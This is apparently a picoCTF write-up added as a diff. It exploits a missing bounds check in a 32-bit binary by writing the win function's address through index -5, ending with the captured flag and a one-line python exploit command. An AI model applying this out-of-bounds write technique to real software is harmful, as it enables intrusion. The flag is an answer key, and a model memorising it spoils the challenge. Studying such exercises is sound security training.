@@ -1,0 +1,69 @@
+An unbounded index can point anywhere!
+
+negative index test
+No bounds checking lol
+
+checksec
+Arch:     i386-32-little - 32bit
+RELRO:    Partial RELRO - can overwrite Global offset table :)
+Stack:    No canary found -- buffer overflow-able lol
+NX:       NX enabled -- no shellcode
+PIE:      No PIE (0x8048000) 
+
+from the stack, try to overwrite GOT of exit? with the address of the win function
+
+find the location of 0x804a018 and write 0x80485c6 or 134514118 as its integer value
+
+Will try to get the distance of 0x804a018 from array[0] (lol hopefully this works)
+
+address of arbitrary write:
+array[index] = value; 
+0x804865c
+
+test the difference of index 0 and -1 & 0 and 1
+index 0 - 0xffffc790
+index 1 - 0xffffc794
+index -1 - 0xffffc78c
+
+nice, 4 byte difference per index.
+
+Get the distance of index 0 to got exit then overwrite with win function
+
+p 0xffffc790 - 0x804a018
+= 0xf7fb2778
+p 0xf7fb2778/4
+= 0x3dfec9de
+or 1040107998
+
+try this value as negative input
+
+lol gg :) 
+
+$eax   : 0x080485c6  →  <win+0> push ebp
+$ebx   : 0x0804a000  →  0x08049f0c  →  0x00000001
+$ecx   : 0x0       
+$edx   : 0x0804a018  →  0x08048456  →  <exit@plt+6> push 0x18
+
+pointer to edx will be overwritten with win func :)
+lol segfault. 
+
+try to overwrite the location of return address?
+
+location of return address on the stack 0xffffc77c
+p 0xffffc790 - 0xffffc77c
+20 / 4  = 5
+distance from index 0 - 5 lol
+this solution worked lol.
+
+maybe the mapping of the libc used is different from the local binary, hence the distance will be affected :(
+
+flag: picoCTF{str1nG_CH3353_1c0aa84b}
+
+Solution:
+Send 134514118 & -5
+
+python -c 'print "134514118\n-5"' | ./vuln
+
+
+
+
